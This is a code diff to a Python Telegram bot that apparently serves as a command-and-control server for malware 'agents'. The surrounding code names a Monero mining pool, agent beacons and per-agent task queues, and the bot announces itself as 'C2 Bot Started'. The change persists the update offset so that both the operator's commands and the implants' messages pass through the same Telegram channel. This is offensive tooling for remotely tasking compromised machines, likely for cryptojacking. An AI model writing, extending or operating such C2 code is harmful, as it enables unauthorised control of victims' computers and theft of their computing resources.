@@ -38,6 +38,27 @@ MINING_POOL = "xmrpool.eu:3333"
 last_update_id = 0
 agents = {}
 pending_tasks = {}  # agent_id -> list of tasks
+OFFSET_FILE = BASE_DIR / "data" / "telegram_offset.txt"
+
+def load_offset():
+    """Load last update offset from file."""
+    global last_update_id
+    if OFFSET_FILE.exists():
+        try:
+            last_update_id = int(OFFSET_FILE.read_text().strip())
+        except:
+            pass
+    return last_update_id
+
+def save_offset(offset):
+    """Save offset to file for agent to read."""
+    global last_update_id
+    last_update_id = offset
+    try:
+        OFFSET_FILE.parent.mkdir(parents=True, exist_ok=True)
+        OFFSET_FILE.write_text(str(offset))
+    except:
+        pass
 
 def get_db():
     """Get database connection."""
@@ -476,34 +497,46 @@ def handle_agent_beacon(message):
             print(f"[TG-BRIDGE-ERROR] {e}")
 
 def poll_loop():
-    """Main polling loop."""
+    """Main polling loop - processes updates but keeps them available for agent."""
     global last_update_id
+    
+    # Load saved offset
+    load_offset()
     
     print(f"[TG-START] Bot polling started")
     print(f"[TG-INFO] Token: {BOT_TOKEN[:20]}...")
     print(f"[TG-INFO] Admin chat: {CHAT_ID}")
+    print(f"[TG-INFO] Offset: {last_update_id}")
     
     # Send startup message
     send_message("🚀 <b>C2 Bot Started</b>\n\nServer is online and ready.")
     
     while True:
         try:
-            result = get_updates(offset=last_update_id + 1, timeout=POLL_INTERVAL)
+            # Get updates WITHOUT confirming them (don't advance offset)
+            # This allows agent to also read the same updates
+            result = get_updates(offset=last_update_id, timeout=1)  # Use current offset, not +1
             
             if result.get("ok"):
                 for update in result.get("result", []):
-                    last_update_id = update["update_id"]
+                    update_id = update["update_id"]
                     
-                    if "message" in update:
-                        msg = update["message"]
-                        chat_id = msg["chat"]["id"]
+                    # Only process new updates
+                    if update_id > last_update_id:
+                        if "message" in update:
+                            msg = update["message"]
+                            chat_id = msg["chat"]["id"]
+                            
+                            # Handle commands from admin
+                            if chat_id == int(CHAT_ID):
+                                handle_command(msg)
+                            else:
+                                # Message from agent
+                                handle_agent_message(msg)
                         
-                        # Handle commands from admin
-                        if chat_id == int(CHAT_ID):
-                            handle_command(msg)
-                        else:
-                            # Message from agent
-                            handle_agent_message(msg)
+                        # Update offset AFTER processing
+                        last_update_id = update_id
+                        save_offset(update_id)
             
             time.sleep(1)
             
